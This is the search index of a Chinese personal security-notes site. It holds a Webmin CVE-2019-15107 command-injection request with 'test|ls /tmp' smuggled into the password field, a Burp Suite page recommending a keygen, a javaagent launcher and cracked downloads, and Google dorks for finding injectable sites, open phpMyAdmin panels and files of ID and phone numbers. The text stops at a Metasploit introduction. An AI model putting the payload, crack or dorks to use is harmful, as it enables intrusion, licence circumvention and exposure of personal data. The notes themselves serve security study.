{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Learn Security \u6b64\u6587\u6863\u4e3a @yzbtdiy \u7684\u7f51\u7edc\u5b89\u5168\u5b66\u4e60\u7b14\u8bb0, \u6240\u6709\u5185\u5bb9\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003, \u5207\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014.","title":"Learn Security"},{"location":"#learn-security","text":"","title":"Learn Security"},{"location":"#yzbtdiy","text":"","title":"\u6b64\u6587\u6863\u4e3a @yzbtdiy \u7684\u7f51\u7edc\u5b89\u5168\u5b66\u4e60\u7b14\u8bb0,"},{"location":"#_1","text":"","title":"\u6240\u6709\u5185\u5bb9\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003,"},{"location":"#_2","text":"","title":"\u5207\u52ff\u7528\u4e8e\u975e\u6cd5\u7528\u9014."},{"location":"poc/webmin/","text":"webmin \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \uff08CVE-2019-15107\uff09 \u7b80\u4ecb Webmin\u662f\u529f\u80fd\u5f3a\u5927\u7684\u57fa\u4e8eWeb\u7684\u7c7bUnix\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177. \u5728\u627e\u56de\u5bc6\u7801\u9875\u9762\u5b58\u5728\u65e0\u9700\u6743\u9650\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e, \u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4. POC \u901a\u8fc7 Burpsuite \u53d1\u9001\u4fee\u6539\u5bc6\u7801\u7684 post \u8bf7\u6c42, \u53ef\u4ee5\u8c03\u7528\u7cfb\u7edf\u547d\u4ee4. POST /password_change.cgi HTTP/1.1 Host: 192.168.128.108:59354 Cookie: redirect=1; testing=1 Content-Length: 65 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 Origin: https://192.168.128.108:59354 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://192.168.128.108:59354/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close user=rootxx&pam=&expired=2&old=test|ls /tmp&new1=test2&new2=test2","title":"Webmin"},{"location":"poc/webmin/#webmin-cve-2019-15107","text":"","title":"webmin \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \uff08CVE-2019-15107\uff09"},{"location":"poc/webmin/#_1","text":"Webmin\u662f\u529f\u80fd\u5f3a\u5927\u7684\u57fa\u4e8eWeb\u7684\u7c7bUnix\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177. \u5728\u627e\u56de\u5bc6\u7801\u9875\u9762\u5b58\u5728\u65e0\u9700\u6743\u9650\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e, \u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4.","title":"\u7b80\u4ecb"},{"location":"poc/webmin/#poc","text":"\u901a\u8fc7 Burpsuite \u53d1\u9001\u4fee\u6539\u5bc6\u7801\u7684 post \u8bf7\u6c42, \u53ef\u4ee5\u8c03\u7528\u7cfb\u7edf\u547d\u4ee4. POST /password_change.cgi HTTP/1.1 Host: 192.168.128.108:59354 Cookie: redirect=1; testing=1 Content-Length: 65 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 Origin: https://192.168.128.108:59354 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://192.168.128.108:59354/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close user=rootxx&pam=&expired=2&old=test|ls /tmp&new1=test2&new2=test2","title":"POC"},{"location":"tools/burpsuite/","text":"Burpsuite \u7b80\u4ecb BurpSuite\u662f\u4e00\u4e2a\u96c6\u6210\u5316\u7684\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177\uff0c\u5b83\u96c6\u5408\u4e86\u591a\u79cd\u6e17\u900f\u6d4b\u8bd5\u7ec4\u4ef6\uff0c\u4f7f\u6211\u4eec\u81ea\u52a8\u5316\u5730\u6216\u624b\u5de5\u5730\u80fd\u66f4\u597d\u7684\u5b8c\u6210\u5bf9web\u5e94\u7528\u7684\u6e17\u900f\u6d4b\u8bd5\u548c\u653b\u51fb\u3002\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528Burp Suite\u5c06\u4f7f\u5f97\u6d4b\u8bd5\u5de5\u4f5c\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u548c\u65b9\u4fbf\uff0c\u5373\u4f7f\u5728\u4e0d\u9700\u8981\u5a34\u719f\u7684\u6280\u5de7\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u6211\u4eec\u719f\u6089Burp Suite\u7684\u4f7f\u7528\uff0c\u4e5f\u4f7f\u5f97\u6e17\u900f\u6d4b\u8bd5\u5de5\u4f5c\u53d8\u5f97\u8f7b\u677e\u548c\u9ad8\u6548\u3002 BurpSuite\u57fa\u4e8eJava\u5f00\u53d1, \u65b0\u7248\u672c\u8981\u6c42Java9\u53ca\u4ee5\u4e0aJDK, \u5efa\u8bae\u4f7f\u7528JDK11 JDK \u4e0b\u8f7d \u9664\u4e86Oracle\u5b98\u65b9\u7684JDK\u4ee5\u5916\u8fd8\u6709\u8bb8\u591a\u57fa\u4e8eOpenJDK\u884d\u751f\u51fa\u6765\u7684\u5176\u4ed6\u7248\u672c, \u5982corretto-jdk(\u4e9a\u9a6c\u900a), dragonwell-jdk(\u963f\u91cc), microsoft-jdk(\u5fae\u8f6f)\u7b49\u4f17\u591a\u5382\u5546\u63d0\u4f9b\u7684\u884d\u751f\u7248JDK \u63a8\u8350\u5fae\u8f6f\u7684JDK11: https://aka.ms/download-jdk/microsoft-jdk-11.0.13.8.1-windows-x64.msi Burpsuite \u4e0b\u8f7d \u65b0\u7248BurpSuite\u5b98\u7f51\u5df2\u5f00\u653e\u4e0b\u8f7d: https://portswigger.net/Burp/Releases \u76ee\u524d\u5b98\u65b9\u4e0b\u8f7d\u7684 BurpSuite jar \u6587\u4ef6\u5df2\u6709 500mb \u5de6\u53f3\u5927\u5c0f, \u5176\u4e2d\u5305\u542b\u4e86\u591a\u4e2a\u5e73\u53f0\u7684 chromium \u6d4f\u89c8\u5668\u538b\u7f29\u5305, \u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u5176\u4ed6\u5e73\u53f0\u7684 chromium \u6d4f\u89c8\u5668\u7684\u538b\u7f29\u53051, \u8fd9\u6837\u53ef\u4ee5\u5c06 jar \u6587\u4ef6\u51cf\u5c0f\u5230 200mb \u4ee5\u5185. \u6ce8\u518c\u673a \u6ce8\u518c\u673a\u53ef\u5728Github\u4e0a\u67e5\u627e, \u63a8\u8350: https://github.com/h3110w0r1d-y/BurpLoaderKeygen bat\u6279\u5904\u7406 @echo off start \"burpsuite\" /B javaw.exe -javaagent:BurpLoaderKeygen.jar -noverify -jar burpsuite_pro.jar exit 0 \u543e\u7231\u7834\u89e3\u7231\u76d8\u4e0b\u8f7d \u543e\u7231\u7834\u89e3\u8bba\u575b\u7684\u7231\u76d8\u63d0\u4f9b\u4e86\u5185\u7f6e\u6388\u6743\u6587\u4ef6\u7684Brupsuite\u7684\u8001\u7248\u672c\u548c\u6700\u65b0\u7248\u7684\u538b\u7f29\u5305, \u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u4f7f\u7528: https://down.52pojie.cn/Tools/Network_Analyzer/","title":"Burpsuite \u7b80\u4ecb"},{"location":"tools/burpsuite/#burpsuite","text":"BurpSuite\u662f\u4e00\u4e2a\u96c6\u6210\u5316\u7684\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177\uff0c\u5b83\u96c6\u5408\u4e86\u591a\u79cd\u6e17\u900f\u6d4b\u8bd5\u7ec4\u4ef6\uff0c\u4f7f\u6211\u4eec\u81ea\u52a8\u5316\u5730\u6216\u624b\u5de5\u5730\u80fd\u66f4\u597d\u7684\u5b8c\u6210\u5bf9web\u5e94\u7528\u7684\u6e17\u900f\u6d4b\u8bd5\u548c\u653b\u51fb\u3002\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528Burp Suite\u5c06\u4f7f\u5f97\u6d4b\u8bd5\u5de5\u4f5c\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u548c\u65b9\u4fbf\uff0c\u5373\u4f7f\u5728\u4e0d\u9700\u8981\u5a34\u719f\u7684\u6280\u5de7\u7684\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u6211\u4eec\u719f\u6089Burp Suite\u7684\u4f7f\u7528\uff0c\u4e5f\u4f7f\u5f97\u6e17\u900f\u6d4b\u8bd5\u5de5\u4f5c\u53d8\u5f97\u8f7b\u677e\u548c\u9ad8\u6548\u3002 BurpSuite\u57fa\u4e8eJava\u5f00\u53d1, \u65b0\u7248\u672c\u8981\u6c42Java9\u53ca\u4ee5\u4e0aJDK, \u5efa\u8bae\u4f7f\u7528JDK11","title":"Burpsuite \u7b80\u4ecb"},{"location":"tools/burpsuite/#jdk","text":"\u9664\u4e86Oracle\u5b98\u65b9\u7684JDK\u4ee5\u5916\u8fd8\u6709\u8bb8\u591a\u57fa\u4e8eOpenJDK\u884d\u751f\u51fa\u6765\u7684\u5176\u4ed6\u7248\u672c, \u5982corretto-jdk(\u4e9a\u9a6c\u900a), dragonwell-jdk(\u963f\u91cc), microsoft-jdk(\u5fae\u8f6f)\u7b49\u4f17\u591a\u5382\u5546\u63d0\u4f9b\u7684\u884d\u751f\u7248JDK \u63a8\u8350\u5fae\u8f6f\u7684JDK11: https://aka.ms/download-jdk/microsoft-jdk-11.0.13.8.1-windows-x64.msi","title":"JDK \u4e0b\u8f7d"},{"location":"tools/burpsuite/#burpsuite_1","text":"\u65b0\u7248BurpSuite\u5b98\u7f51\u5df2\u5f00\u653e\u4e0b\u8f7d: https://portswigger.net/Burp/Releases \u76ee\u524d\u5b98\u65b9\u4e0b\u8f7d\u7684 BurpSuite jar \u6587\u4ef6\u5df2\u6709 500mb \u5de6\u53f3\u5927\u5c0f, \u5176\u4e2d\u5305\u542b\u4e86\u591a\u4e2a\u5e73\u53f0\u7684 chromium \u6d4f\u89c8\u5668\u538b\u7f29\u5305, \u53ef\u4ee5\u76f4\u63a5\u5220\u9664\u5176\u4ed6\u5e73\u53f0\u7684 chromium \u6d4f\u89c8\u5668\u7684\u538b\u7f29\u53051, \u8fd9\u6837\u53ef\u4ee5\u5c06 jar \u6587\u4ef6\u51cf\u5c0f\u5230 200mb \u4ee5\u5185.","title":"Burpsuite \u4e0b\u8f7d"},{"location":"tools/burpsuite/#_1","text":"\u6ce8\u518c\u673a\u53ef\u5728Github\u4e0a\u67e5\u627e, \u63a8\u8350: https://github.com/h3110w0r1d-y/BurpLoaderKeygen","title":"\u6ce8\u518c\u673a"},{"location":"tools/burpsuite/#bat","text":"@echo off start \"burpsuite\" /B javaw.exe -javaagent:BurpLoaderKeygen.jar -noverify -jar burpsuite_pro.jar exit 0","title":"bat\u6279\u5904\u7406"},{"location":"tools/burpsuite/#_2","text":"\u543e\u7231\u7834\u89e3\u8bba\u575b\u7684\u7231\u76d8\u63d0\u4f9b\u4e86\u5185\u7f6e\u6388\u6743\u6587\u4ef6\u7684Brupsuite\u7684\u8001\u7248\u672c\u548c\u6700\u65b0\u7248\u7684\u538b\u7f29\u5305, \u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u4f7f\u7528: https://down.52pojie.cn/Tools/Network_Analyzer/","title":"\u543e\u7231\u7834\u89e3\u7231\u76d8\u4e0b\u8f7d"},{"location":"tools/info_collect/","text":"\u4fe1\u606f\u6536\u96c6 Google Hacking site: site:thief.one \u5c06\u8fd4\u56de\u6240\u6709\u548c\u8fd9\u4e2a\u7ad9\u6709\u5173\u7684URL inurl: \u641c\u7d22\u6211\u4eec\u6307\u5b9a\u7684\u5b57\u7b26\u662f\u5426\u5b58\u5728\u4e8eURL\u4e2d intitle: \u5c06\u8fd4\u56de\u6240\u6709\u7f51\u9875\u6807\u9898\u4e2d\u5305\u542b\u5173\u952e\u8bcd\u7684\u7f51\u9875 intext: \u5c06\u8fd4\u56de\u6240\u6709\u5728\u7f51\u9875\u6b63\u6587\u90e8\u5206\u5305\u542b\u5173\u952e\u8bcd\u7684\u7f51\u9875 cache: \u641c\u7d22Google\u91cc\u5173\u4e8e\u67d0\u4e9b\u5185\u5bb9\u7684\u7f13\u5b58 define: \u641c\u7d22\u67d0\u4e2a\u8bcd\u8bed\u7684\u5b9a\u4e49 filetype: \u641c\u7d22\u6307\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u5982\uff1abak,.mdb,.inc\u7b49 info: \u67e5\u627e\u6307\u5b9a\u7ad9\u70b9\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f Link: link:thief.one \u53ef\u4ee5\u8fd4\u56de\u6240\u6709\u548cthief.one\u505a\u4e86\u94fe\u63a5\u7684URL index of: \u627e\u76ee\u5f55\u904d\u5386\u4f1a\u7528\u5230 + \u5f3a\u5236\u5305\u542b\u67d0\u4e2a\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 - \u67e5\u8be2\u7684\u65f6\u5019\u5ffd\u7565\u67d0\u4e2a\u5b57\u7b26 \"\" \u67e5\u8be2\u7684\u65f6\u5019\u7cbe\u786e\u5339\u914d\u53cc\u5f15\u53f7\u5185\u7684\u5b57\u7b26 . \u5339\u914d\u67d0\u5355\u4e2a\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 * \u5339\u914d\u4efb\u610f\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 | \u6216\u8005, \u8868\u793a\u591a\u4e2a\u9009\u62e9, \u53ea\u8981\u6709\u4e00\u4e2a\u5173\u952e\u5b57\u5339\u914d\u5373\u53ef \u6ce8\u610f: \u5728\u64cd\u4f5c\u7b26, \u5192\u53f7, \u641c\u7d22\u9879\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c \u4e00\u4e9b\u4f8b\u5b50 intitle:\"Index of /ThinkPHP\" | inurl:\"/ThinkPHP/\" \u5bfb\u627e\u57fa\u4e8eThinkPHP \u5f00\u53d1\u7684\u5e94\u7528 inurl:\".php?id=\" \"you have an error in your sql syntax\" \u5bfb\u627e\u53ef\u80fd\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\u7684\u7cfb\u7edf inurl:/admin/upfile.asp \u5bfb\u627e\u6587\u4ef6\u4e0a\u4f20\u5730\u5740 inurl:.php? intext:CHARACTER_SETS,COLLATIONS,? intitle:phpmyadmin \u5bfb\u627e\u672a\u6388\u6743 phpmyadmin filetype:xls \u8eab\u4efd\u8bc1 \u624b\u673a \u67e5\u627e\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6587\u4ef6 Google Hacking Database https://www.exploit-db.com/google-hacking-database \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\u662f\u5bf9\u5168\u7403\u7f51\u7edc\u7a7a\u95f4\u57fa\u7840\u8bbe\u65bd\u6216\u7f51\u7edc\u8bbe\u5907\u8fdb\u884c\u626b\u63cf, \u5e76\u53ef\u4ee5\u5bf9\u6307\u7eb9\u7279\u5f81\u68c0\u7d22\u7684\u5e73\u53f0, \u901a\u8fc7\u626b\u63cf\u5168\u7f51\u8bbe\u5907\u5e76\u6293\u53d6\u89e3\u6790\u5404\u4e2a\u8bbe\u5907\u8fd4\u56de\u7684\u4fe1\u606f. \u53ef\u4ee5\u5bf9\u7f51\u7edc\u7a7a\u95f4\u4e0a\u7684\u5728\u7ebf\u7f51\u7edc\u8bbe\u5907\u8fdb\u884c\u68c0\u7d22, \u5982\u670d\u52a1\u5668, \u8def\u7531\u5668, \u4ea4\u6362\u673a, \u516c\u5171 IP \u6253\u5370\u673a, \u7f51\u7edc\u6444\u50cf\u5934\u7b49. https://www.shodan.io/ https://fofa.so/ https://censys.io/ https://www.zoomeye.org/ \u5b50\u57df\u540d\u4fe1\u606f\u6536\u96c6 \u57fa\u4e8e\u5b57\u5178\u5bf9\u5b50\u57df\u540d\u7206\u7834\u679a\u4e3e subDomainsBrute \u7b2c\u4e09\u65b9\u805a\u5408 DNS \u6570\u636e\u96c6 DNSdumpster VirusTotal Netcraft \u8bc1\u4e66\u900f\u660e\u5ea6 \u6388\u6743\u673a\u6784(CA)\u662f\u4e00\u4e2a\u53d7\u4fe1\u4efb\u7684\u7b2c\u4e09\u65b9\u7ec4\u7ec7, \u8d1f\u8d23\u53d1\u5e03\u548c\u7ba1\u7406SSL/TLS\u8bc1\u4e66, \u5168\u7403\u6709\u6570\u767e\u4e2a\u53d7\u4fe1\u4efb\u7684CA, \u4ed6\u4eec\u4e2d\u4efb\u4f55\u4e00\u4e2a\u90fd\u6709\u6743\u5229\u4e3a\u4f60\u7684\u57df\u540d\u9881\u53d1\u6709\u6548\u7684SSL\u8bc1\u4e66. \u8bc1\u4e66\u900f\u660e\u5ea6(CT)\u662f\u4e3a\u4e86\u9632\u6b62\u8bc1\u4e66\u6388\u6743\u673a\u6784(CA)\u6216\u8005\u5176\u4ed6\u6076\u610f\u4eba\u5458\u4f2a\u9020\u670d\u52a1\u5668\u8bc1\u4e66\u800c\u8bde\u751f\u7684\u4e00\u4e2a\u9879\u76ee. CT\u4f1a\u8981\u6c42CA\u5c06\u6570\u5b57\u8bc1\u4e66(SSL/TLS\u8bc1\u4e66)\u516c\u5f00\u5e76\u53d1\u5e03\u5c06\u9881\u53d1\u8bb0\u5f55\u540c\u6b65\u5230\u65e5\u5fd7\u670d\u52a1\u5668\u4e2d. \u800c\u65e5\u5fd7\u670d\u52a1\u5668\u5219\u4f1a\u63d0\u4f9b\u7ed9\u7528\u6237\u4e00\u4e2a\u67e5\u627e\u67d0\u57df\u540d\u9881\u53d1\u7684\u6240\u6709\u6570\u5b57\u8bc1\u4e66\u9014\u5f84\u3002 \u6570\u5b57\u8bc1\u4e66\u4e2d\u4f1a\u5305\u542b\u5b50\u57df\u540d\u7684\u76f8\u5173\u4fe1\u606f. CT \u65e5\u5fd7\u53ea\u80fd\u589e\u52a0, \u4e0d\u80fd\u51cf\u5c11, \u6240\u4ee5\u8bc1\u4e66\u4e0a\u7684\u5b50\u57df\u540d\u53ef\u80fd\u662f\u8fc7\u671f\u7684\u72b6\u6001, \u53ef\u4ee5\u4f7f\u7528 masdns \u5de5\u5177\u5bf9\u57df\u540d\u89e3\u6790\u8bc6\u522b. CT \u65e5\u5fd7\u67e5\u8be2\u5e73\u53f0 crt.sh Censys Google\u900f\u660e\u5ea6\u62a5\u544a Facebook\u900f\u660e\u5ea6 CSP \u7f51\u9875\u5b89\u5168\u653f\u7b56( Content Security Policy, \u7f29\u5199CSP). CSP\u7684\u5b9e\u8d28\u5c31\u662f\u767d\u540d\u5355\u5236\u5ea6, \u5f00\u53d1\u8005\u660e\u786e\u544a\u8bc9\u5ba2\u6237\u7aef, \u54ea\u4e9b\u5916\u90e8\u8d44\u6e90\u53ef\u4ee5\u52a0\u8f7d\u548c\u6267\u884c, \u7b49\u540c\u4e8e\u63d0\u4f9b\u767d\u540d\u5355. \u53ef\u4ee5\u67e5\u770b HTTP \u7684 Content-Security-Policy \u5b57\u6bb5\u6765\u641c\u96c6\u5b50\u57df\u540d\u4fe1\u606f.","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"tools/info_collect/#_1","text":"","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"tools/info_collect/#google-hacking","text":"site: site:thief.one \u5c06\u8fd4\u56de\u6240\u6709\u548c\u8fd9\u4e2a\u7ad9\u6709\u5173\u7684URL inurl: \u641c\u7d22\u6211\u4eec\u6307\u5b9a\u7684\u5b57\u7b26\u662f\u5426\u5b58\u5728\u4e8eURL\u4e2d intitle: \u5c06\u8fd4\u56de\u6240\u6709\u7f51\u9875\u6807\u9898\u4e2d\u5305\u542b\u5173\u952e\u8bcd\u7684\u7f51\u9875 intext: \u5c06\u8fd4\u56de\u6240\u6709\u5728\u7f51\u9875\u6b63\u6587\u90e8\u5206\u5305\u542b\u5173\u952e\u8bcd\u7684\u7f51\u9875 cache: \u641c\u7d22Google\u91cc\u5173\u4e8e\u67d0\u4e9b\u5185\u5bb9\u7684\u7f13\u5b58 define: \u641c\u7d22\u67d0\u4e2a\u8bcd\u8bed\u7684\u5b9a\u4e49 filetype: \u641c\u7d22\u6307\u5b9a\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u5982\uff1abak,.mdb,.inc\u7b49 info: \u67e5\u627e\u6307\u5b9a\u7ad9\u70b9\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f Link: link:thief.one \u53ef\u4ee5\u8fd4\u56de\u6240\u6709\u548cthief.one\u505a\u4e86\u94fe\u63a5\u7684URL index of: \u627e\u76ee\u5f55\u904d\u5386\u4f1a\u7528\u5230 + \u5f3a\u5236\u5305\u542b\u67d0\u4e2a\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 - \u67e5\u8be2\u7684\u65f6\u5019\u5ffd\u7565\u67d0\u4e2a\u5b57\u7b26 \"\" \u67e5\u8be2\u7684\u65f6\u5019\u7cbe\u786e\u5339\u914d\u53cc\u5f15\u53f7\u5185\u7684\u5b57\u7b26 . \u5339\u914d\u67d0\u5355\u4e2a\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 * \u5339\u914d\u4efb\u610f\u5b57\u7b26\u8fdb\u884c\u67e5\u8be2 | \u6216\u8005, \u8868\u793a\u591a\u4e2a\u9009\u62e9, \u53ea\u8981\u6709\u4e00\u4e2a\u5173\u952e\u5b57\u5339\u914d\u5373\u53ef \u6ce8\u610f: \u5728\u64cd\u4f5c\u7b26, \u5192\u53f7, \u641c\u7d22\u9879\u4e4b\u95f4\u6ca1\u6709\u7a7a\u683c \u4e00\u4e9b\u4f8b\u5b50 intitle:\"Index of /ThinkPHP\" | inurl:\"/ThinkPHP/\" \u5bfb\u627e\u57fa\u4e8eThinkPHP \u5f00\u53d1\u7684\u5e94\u7528 inurl:\".php?id=\" \"you have an error in your sql syntax\" \u5bfb\u627e\u53ef\u80fd\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\u7684\u7cfb\u7edf inurl:/admin/upfile.asp \u5bfb\u627e\u6587\u4ef6\u4e0a\u4f20\u5730\u5740 inurl:.php? intext:CHARACTER_SETS,COLLATIONS,? intitle:phpmyadmin \u5bfb\u627e\u672a\u6388\u6743 phpmyadmin filetype:xls \u8eab\u4efd\u8bc1 \u624b\u673a \u67e5\u627e\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6587\u4ef6 Google Hacking Database https://www.exploit-db.com/google-hacking-database","title":"Google Hacking"},{"location":"tools/info_collect/#_2","text":"\u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\u662f\u5bf9\u5168\u7403\u7f51\u7edc\u7a7a\u95f4\u57fa\u7840\u8bbe\u65bd\u6216\u7f51\u7edc\u8bbe\u5907\u8fdb\u884c\u626b\u63cf, \u5e76\u53ef\u4ee5\u5bf9\u6307\u7eb9\u7279\u5f81\u68c0\u7d22\u7684\u5e73\u53f0, \u901a\u8fc7\u626b\u63cf\u5168\u7f51\u8bbe\u5907\u5e76\u6293\u53d6\u89e3\u6790\u5404\u4e2a\u8bbe\u5907\u8fd4\u56de\u7684\u4fe1\u606f. \u53ef\u4ee5\u5bf9\u7f51\u7edc\u7a7a\u95f4\u4e0a\u7684\u5728\u7ebf\u7f51\u7edc\u8bbe\u5907\u8fdb\u884c\u68c0\u7d22, \u5982\u670d\u52a1\u5668, \u8def\u7531\u5668, \u4ea4\u6362\u673a, \u516c\u5171 IP \u6253\u5370\u673a, \u7f51\u7edc\u6444\u50cf\u5934\u7b49. https://www.shodan.io/ https://fofa.so/ https://censys.io/ https://www.zoomeye.org/","title":"\u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce"},{"location":"tools/info_collect/#_3","text":"\u57fa\u4e8e\u5b57\u5178\u5bf9\u5b50\u57df\u540d\u7206\u7834\u679a\u4e3e subDomainsBrute \u7b2c\u4e09\u65b9\u805a\u5408 DNS \u6570\u636e\u96c6 DNSdumpster VirusTotal Netcraft","title":"\u5b50\u57df\u540d\u4fe1\u606f\u6536\u96c6"},{"location":"tools/info_collect/#_4","text":"\u6388\u6743\u673a\u6784(CA)\u662f\u4e00\u4e2a\u53d7\u4fe1\u4efb\u7684\u7b2c\u4e09\u65b9\u7ec4\u7ec7, \u8d1f\u8d23\u53d1\u5e03\u548c\u7ba1\u7406SSL/TLS\u8bc1\u4e66, \u5168\u7403\u6709\u6570\u767e\u4e2a\u53d7\u4fe1\u4efb\u7684CA, \u4ed6\u4eec\u4e2d\u4efb\u4f55\u4e00\u4e2a\u90fd\u6709\u6743\u5229\u4e3a\u4f60\u7684\u57df\u540d\u9881\u53d1\u6709\u6548\u7684SSL\u8bc1\u4e66. \u8bc1\u4e66\u900f\u660e\u5ea6(CT)\u662f\u4e3a\u4e86\u9632\u6b62\u8bc1\u4e66\u6388\u6743\u673a\u6784(CA)\u6216\u8005\u5176\u4ed6\u6076\u610f\u4eba\u5458\u4f2a\u9020\u670d\u52a1\u5668\u8bc1\u4e66\u800c\u8bde\u751f\u7684\u4e00\u4e2a\u9879\u76ee. CT\u4f1a\u8981\u6c42CA\u5c06\u6570\u5b57\u8bc1\u4e66(SSL/TLS\u8bc1\u4e66)\u516c\u5f00\u5e76\u53d1\u5e03\u5c06\u9881\u53d1\u8bb0\u5f55\u540c\u6b65\u5230\u65e5\u5fd7\u670d\u52a1\u5668\u4e2d. \u800c\u65e5\u5fd7\u670d\u52a1\u5668\u5219\u4f1a\u63d0\u4f9b\u7ed9\u7528\u6237\u4e00\u4e2a\u67e5\u627e\u67d0\u57df\u540d\u9881\u53d1\u7684\u6240\u6709\u6570\u5b57\u8bc1\u4e66\u9014\u5f84\u3002 \u6570\u5b57\u8bc1\u4e66\u4e2d\u4f1a\u5305\u542b\u5b50\u57df\u540d\u7684\u76f8\u5173\u4fe1\u606f. CT \u65e5\u5fd7\u53ea\u80fd\u589e\u52a0, \u4e0d\u80fd\u51cf\u5c11, \u6240\u4ee5\u8bc1\u4e66\u4e0a\u7684\u5b50\u57df\u540d\u53ef\u80fd\u662f\u8fc7\u671f\u7684\u72b6\u6001, \u53ef\u4ee5\u4f7f\u7528 masdns \u5de5\u5177\u5bf9\u57df\u540d\u89e3\u6790\u8bc6\u522b. CT \u65e5\u5fd7\u67e5\u8be2\u5e73\u53f0 crt.sh Censys Google\u900f\u660e\u5ea6\u62a5\u544a Facebook\u900f\u660e\u5ea6","title":"\u8bc1\u4e66\u900f\u660e\u5ea6"},{"location":"tools/info_collect/#csp","text":"\u7f51\u9875\u5b89\u5168\u653f\u7b56( Content Security Policy, \u7f29\u5199CSP). CSP\u7684\u5b9e\u8d28\u5c31\u662f\u767d\u540d\u5355\u5236\u5ea6, \u5f00\u53d1\u8005\u660e\u786e\u544a\u8bc9\u5ba2\u6237\u7aef, \u54ea\u4e9b\u5916\u90e8\u8d44\u6e90\u53ef\u4ee5\u52a0\u8f7d\u548c\u6267\u884c, \u7b49\u540c\u4e8e\u63d0\u4f9b\u767d\u540d\u5355. \u53ef\u4ee5\u67e5\u770b HTTP \u7684 Content-Security-Policy \u5b57\u6bb5\u6765\u641c\u96c6\u5b50\u57df\u540d\u4fe1\u606f.","title":"CSP"},{"location":"tools/msf/","text":"Metasploit-Framework \u7b80\u4ecb Metasploit \u662f\u4e00\u6b3e\u5f00\u6e90\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u5e73\u53f0, \u5230\u76ee\u524d\u4e3a\u6b62, msf \u5df2\u7ecf\u5185\u7f6e\u6570\u5343\u4e2a\u5df2\u62ab\u9732\u7684\u6f0f\u6d1e\u76f8\u5173\u7684\u6a21\u5757\u548c\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177, \u6a21\u5757\u4f7f\u7528 ruby \u8bed\u8a00\u7f16\u5199, \u4f7f\u7528\u8005\u80fd\u591f\u6839\u636e\u9700\u8981\u5bf9\u6a21\u5757\u8fdb\u884c\u9002\u5f53\u4fee\u6539, 